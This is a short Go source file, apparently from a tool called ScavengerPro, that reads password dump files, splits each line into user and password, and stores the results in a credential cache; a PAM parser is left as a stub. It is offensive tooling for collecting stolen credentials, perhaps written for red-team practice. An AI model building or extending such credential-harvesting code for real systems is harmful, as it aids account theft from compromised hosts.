// watch password dump files, parse them and return them as normalized data
// @author: degenerat3

package main

import (
	"ScavengerPro/client/cred_cache"
	"bufio"
	"fmt"
	"os"
	"strings"
)

// take file list in form: ["filename:parser" "file2:parser2"...]
func check_files(files []string, c cred_cache.CredCache) {
	for _, f := range files {
		if strings.Contains(f, "def") {
			fmt.Printf("doing default parse\n")
			default_parse(f, c)
		}
		if strings.Contains(f, "pam") {
			fmt.Printf("doing PAM parse\n")
			pam_parse(f, c)
		}
	}
}

func default_parse(fi string, c cred_cache.CredCache) []string {
	var res []string
	fname := strings.Split(fi, ":")[0]
	fmt.Printf("File name: %s\n", fname)
	f, _ := os.Open(fname)
	defer f.Close()
	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	for _, ln := range lines {
		sp := strings.SplitN(ln, ":", 2)
		typ := "system"
		user := sp[0]
		pass := sp[1]
		fin := typ + ":" + user + ":" + pass
		res = append(res, fin)
		c.Add_entry(fin)
	}
	fmt.Printf("%s", res)
	return nil
}

func pam_parse(f string, c cred_cache.CredCache) []string {
	//TODO: write the PAM parser
	return nil
}
